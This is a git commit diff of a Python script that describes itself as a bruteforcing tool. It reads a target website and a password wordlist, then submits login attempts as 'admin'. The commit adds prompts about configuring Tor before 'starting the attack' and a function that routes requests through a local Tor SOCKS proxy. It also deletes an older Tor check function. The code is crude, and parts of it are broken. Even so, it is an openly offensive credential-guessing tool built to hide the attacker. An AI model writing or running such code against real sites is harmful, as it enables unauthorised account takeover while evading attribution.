c1cf712ceb1677fce6558aaf298b2a496c73ae66
aashish baweja <aashishbaweja03@gmail.com>
2019-07-30 18:54:36 +0000

    Update tool.py

--- tool.py
+++ tool.py
@@ -1,28 +1,35 @@
+#!/usr/bin/python
+
 import requests
 from pip._vendor.distlib.compat import raw_input
 
+print("[+]...This is a bruteforcing tool")
+print("[+]..first install tor and configure it before starting the attack")
 
+#setting the proxy to use with tor
+def setupTOR(self):
+    self.proxies = {'http':'socks5://localhost:9050','https':'socks5://localhost:9050'}
 
-print("this is a bruteforcing tool")
 
 target_url = raw_input("enter the target website for bruteforcing: ")
+
+#variable for storing the username 
+
+#usernamelist = raw_input("enter the username for which you have to bruteforce: ")
 
 
 #variable for storing the passwords
 password_list = raw_input("enter the path of the password list: ")
 
 
-
 #data dict for taking the values for the input function specifying for each parameter
 
-data_dict = {"username": "admin", "password": " ", "Login": "submit"}
+data_dict = {"username": "admin", "password": "", "Login": "submit"}
 
 
 #sending the post requests to the target website
 
 #showing the html code for the target page
-
-
 
 with open(password_list, "r") as wordlist:
     for line in wordlist:
@@ -36,27 +43,4 @@ with open(password_list, "r") as wordlist:
 
 print("[+] Reached end of line")
 
-# proxies section and connection within tor network
 
-session = requests.session()
-session.proxies = {}
-session.proxies['http'] = 'socks5h://localhost:9050'
-session.proxies['https'] = 'socks5h://localhost:9050'
-
-
-r = session.get(‘')
-print(r.text)
-
-#function for checking tor is configured correctly
-def checkTor(self):
-		isConfigured = False
-		if self.useTor:
-			self.setupTOR()
-		if self.proxies:
-			try:
-				response = requests.get('https://check.torproject.org/',headers=self.getSpoofedHeaders(),proxies=self.proxies)
-				if self.CHECK_TOR_REGEX.search(response.text):
-					isConfigured = True
-			except Exception as e:
-				print(e)
-		return isConfigured
